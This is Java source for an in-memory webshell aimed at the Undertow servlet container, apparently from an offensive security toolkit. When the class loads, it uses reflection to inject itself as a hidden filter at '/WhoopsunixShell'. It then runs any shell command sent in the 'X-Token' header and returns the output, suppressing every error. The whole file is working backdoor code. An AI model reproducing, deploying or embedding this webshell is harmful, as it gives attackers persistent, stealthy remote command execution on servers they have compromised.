package com.example.undertow.memshell;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

/**
 * @author Whoopsunix
 */
public class UndertowFilterExecMS implements Filter {
    private static String NAME = "Whoopsunix";
    private static String PATTERN = "/WhoopsunixShell";
    private static String HEADER = "X-Token";

    static {
        try {
            UndertowFilterExecMS undertowFilterExecMS = new UndertowFilterExecMS();

            Object threadLocals = getFieldValue(Thread.currentThread(), "threadLocals");
            Object[] table = (Object[]) getFieldValue(threadLocals, "table");

            for (int i = 0; i < table.length; i++) {
                Object entry = table[i];
                if (entry == null)
                    continue;
                Object value = getFieldValue(entry, "value");
                if (value == null)
                    continue;

                try {
                    if (value.getClass().getName().equals("io.undertow.servlet.handlers.ServletRequestContext")) {
                        if (isInject(value, undertowFilterExecMS)) {
                            break;
                        }
                        inject(value, undertowFilterExecMS);
                    }
                } catch (Exception e) {
                    
                }
            }
        } catch (Exception e) {
            
        }
    }

    public static boolean isInject(Object servletRequestContext, Object object) {
        try{
            String NAME = (String) getFieldValue(object, "NAME");
            Object deployment = getFieldValue(servletRequestContext, "deployment");
            Object filters = getFieldValue(deployment, "filters");
            HashMap result = (HashMap) invokeMethod(filters, "getFilters", new Class[]{}, new Object[]{});
            if (result.containsKey(NAME)){
                return true;
            }
        }catch (Exception e){

        }

        return false;
    }

    public static void inject(Object servletRequestContext, Object object) {
        try {
            String NAME = (String) getFieldValue(object, "NAME");
            String PATTERN = (String) getFieldValue(object, "PATTERN");
            Object deployment = getFieldValue(servletRequestContext, "deployment");
            Object deploymentInfo = getFieldValue(deployment, "deploymentInfo");
            Object filterInfo = Class.forName("io.undertow.servlet.api.FilterInfo").getConstructor(String.class, Class.class).newInstance(NAME, object.getClass());
            invokeMethod(deploymentInfo, "addFilter", new Class[]{Class.forName("io.undertow.servlet.api.FilterInfo")}, new Object[]{filterInfo});
            invokeMethod(deploymentInfo, "addFilterUrlMapping", new Class[]{String.class, String.class, DispatcherType.class}, new Object[]{NAME, PATTERN, DispatcherType.REQUEST});
            Object filters = getFieldValue(deployment, "filters");
            invokeMethod(filters, "addFilter", new Class[]{Class.forName("io.undertow.servlet.api.FilterInfo")}, new Object[]{filterInfo});

//            // todo 是否要添加响应头标记注入成功
//            Object response = getFieldValue(servletRequestContext, "originalResponse");
//            // public void setStatus(final int sc) {
//            invokeMethod(response, "setStatus", new Class[]{int.class}, new Object[]{200});
//            // public void addHeader(final String name, final String value) {
//            invokeMethod(response, "addHeader", new Class[]{String.class, String.class}, new Object[]{"ok", "fine"});

        } catch (Exception e) {
            
        }
    }


    public void init(FilterConfig filterConfig) throws ServletException {

    }


    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) {
        try {
            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
            String cmd = httpServletRequest.getHeader(HEADER);
            if (cmd == null) {
                return;
            }
            String result = exec(cmd);
            PrintWriter printWriter = servletResponse.getWriter();
            printWriter.println(result);
        } catch (Exception e) {

        }

    }


    public void destroy() {

    }

    public static String exec(String str) {
        try {
            String[] cmd = null;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                cmd = new String[]{"cmd.exe", "/c", str};
            } else {
                cmd = new String[]{"/bin/sh", "-c", str};
            }
            if (cmd != null) {
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                String execresult = exec_result(inputStream);
                return execresult;
            }
        } catch (Exception e) {

        }
        return "";
    }

    public static String exec_result(InputStream inputStream) {
        try {
            byte[] bytes = new byte[1024];
            int len = 0;
            StringBuilder stringBuilder = new StringBuilder();
            while ((len = inputStream.read(bytes)) != -1) {
                stringBuilder.append(new String(bytes, 0, len));
            }
            return stringBuilder.toString();
        } catch (Exception e) {
            return "";
        }
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(Class<?> clazz, String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) {
        try {
            Method method;
            try {
                method = obj.getClass().getDeclaredMethod(methodName, argsClass);
            } catch (NoSuchMethodException e) {
                method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
            }
            method.setAccessible(true);
            Object object = method.invoke(obj, args);
            return object;
        } catch (Exception e) {
            
        }
        return null;
    }
}
